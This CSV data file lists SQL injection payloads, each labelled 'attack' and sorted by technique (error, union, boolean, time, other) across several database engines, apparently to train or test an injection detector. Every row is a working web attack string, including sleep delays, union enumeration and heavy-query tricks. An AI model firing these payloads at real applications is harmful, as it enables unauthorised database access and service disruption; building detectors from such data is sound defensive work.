label,payload,family
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn",error
attack,"-4031%"" union all select 9566--",union
attack,"1%'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",boolean
attack,end and    (    (   'vkle'  =  'vkle,boolean
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",time
attack,1 order by 1--,other
attack,select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #,other
attack,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",time
attack,"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg",error
attack,"1""  )   as rqpp where 9383  =  9383 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",time
attack,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",boolean
attack,"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,1  )   as vbli where 5139  =  5139 and 2782  =  2625--,boolean
attack,"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",error
attack,"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",union
attack,"1""   )    )    as xxdm where 4818  =  4818",other
attack,select   (  case when   (  3365  =  6236  )   then 3365 else 1/  (  select 0  )   end  )  --,other
attack,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1'  )   union all select null,null,null,null,null,null#",union
attack,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",boolean
attack,"-2110' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,1' where 9602  =  9602,other
attack,1'+  (  select iutk where 6158  =  6158,other
attack,"-7083"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ajcl"" like ""ajcl",error
attack,"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",boolean
attack,"1%""   )    )    union all select null,null,null,null--",union
attack,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",error
attack,"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",union
attack,"1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"-9532   )    )    union all select 6039,6039,6039,6039--",union
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time
attack,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe",boolean
attack,"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",boolean
attack,"-9553""  )   as geih where 6453  =  6453 or 8453  =  8159--",boolean
attack,"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",boolean
attack,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'owot'  =  'owot",boolean
attack,"-2378"" where 2686  =  2686 or 6872  =  6872--",boolean
attack,"-5313'  )   union all select 7187,7187,7187#",union
attack,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",union
attack,1'||  (  select 'jlon' where 1461  =  1461,other
attack,select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #,other
attack,"select count  (  *  )   from generate_series  (  1,5000000  )  --",other
attack,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",union
attack,end if,other
attack,"-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#",union
attack,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'asdc' like 'asdc",error
attack,1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'foop' like 'foop,error
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",boolean
attack,"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",error
attack,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",union
attack, (  case when 2646  =  8520 then 2646 else null end  ) ,other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",other
attack,1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'mfmk'  =  'mfmk,error
attack,"-1269' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'gohv' like 'gohv",boolean
attack,"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",error
attack,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",boolean
attack,select case when 1613  =  2937 then 1 else null end--,other
attack,"-3364%""   )    )     )   union all select 5464--",union
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and '%'  =  '",boolean
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",boolean
attack,"-9558"" where 7497  =  7497 or   (  2539  =  6484  )  *6484--",boolean
attack,"-1277""  )   where 6622  =  6622 or 3038  =  3038",boolean
attack,"1""  )   where 1107  =  1107 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"-1171' union all select 3958,3958,3958,3958,3958--",union
attack,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",union
attack,"-3828%""   )    )     )   or make_set  (  1765  =  8657,8657  )   and    (    (     (  ""%""  =  """,boolean
attack,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,"1"" where 4633  =  4633 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,error
attack, (  2329  =  4209  )  *1,other
attack,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",union
attack,"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""fpkm"" like ""fpkm",boolean
attack,"1',  (  case when 5204  =  2136 then 1 else null end  )  ",other
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",boolean
attack,"-2225' union all select 1545,1545,1545,1545#",union
attack,"1' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1%""   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   ""%""  =  """,boolean
attack,"1%' union all select null,null,null,null,null,null,null--",union
attack,-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,boolean
attack,1 where 4844  =  4844,other
attack,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""aixs""  =  ""aixs",boolean
attack,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,time
attack,-6144'  )   or 9385  =  2474--,boolean
attack,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1%'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and '%'  =  '",boolean
attack,1%'   )    )     )   order by 1#,other
attack,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,time
attack,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",union
attack,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690",error
attack,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",error
attack,1' in boolean mode  )   order by 1--,other
attack,-7209'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'stqx'  =  'stqx,error
attack,"1%'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",boolean
attack,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,1'  )   where 3572  =  3572,other
attack,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",time
attack,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,1' where 8128  =  8128,other
attack,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",other
attack,"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",error
attack,"1"" where 9804  =  9804 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1""  )   as fkgs where 5948  =  5948 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"1'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,1%'   )    )     )   and 1661  =  7683,boolean
attack,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",error
attack,end and 'blit'  =  'blit,boolean
attack,"1'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",union
